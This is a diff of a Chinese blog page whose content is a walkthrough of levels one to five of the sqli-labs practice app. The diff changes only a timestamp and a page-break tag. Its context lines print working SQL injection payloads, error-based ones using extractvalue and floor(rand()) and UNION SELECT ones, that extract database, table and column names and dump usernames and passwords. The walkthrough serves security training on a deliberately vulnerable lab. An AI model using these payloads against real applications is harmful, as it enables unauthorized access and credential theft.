@@ -15,7 +15,7 @@
 <meta property="og:description" content="sqli-libs第一关：报错注入：输入?id&#x3D;1页面正常在1后面加’报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)获取数据库名:1’and(select extractvalue(1,concat(0x7">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-03-24T10:00:32.770Z">
-<meta property="article:modified_time" content="2022-04-08T07:44:45.087Z">
+<meta property="article:modified_time" content="2022-04-11T01:42:10.683Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
   
@@ -81,6 +81,8 @@
         <p>sqli-libs<br>第一关：<br>报错注入：<br>输入?id=1页面正常<br>在1后面加’<br>报错注入:1’and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)y)<br>获取数据库名:1’and(select extractvalue(1,concat(0x7e,(select database())))) –+<br>获取表名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))–+<br>获取列名:1’and (select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=”users”))))–+<br>获取数据值:1’and (select extractvalue(1,concat(0x7e,(select group_concat(id,username,0x3a,password) from users where username not in(‘Dumb’)))))–+</p>
 <p>联合查询：<br>union select 1,2,database()–+ 查库<br>union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()–+查表<br>union select 1,2,group_concat(column_name) from information_schema.columns where table_name=”users” –+ 查列<br>union select 1,group_concat(username),group_concat(password) from users –+  查数据</p>
 <p>第二关：<br>第二关与第一关差别不大，只需要在报错后去掉 ‘ 即可，其余不变</p>
+<span id="more"></span>
+
 <p>第三关:<br>与第一关差别不大，只需要在1’后加上)即可，其余不变</p>
 <p>第四关：<br>同前三关一样 只需要把第三关的单引号变成双引号</p>
 <p>第五关：<br>采用报错注入，需要双注入，?id=-1’,其余同前四关一致</p>
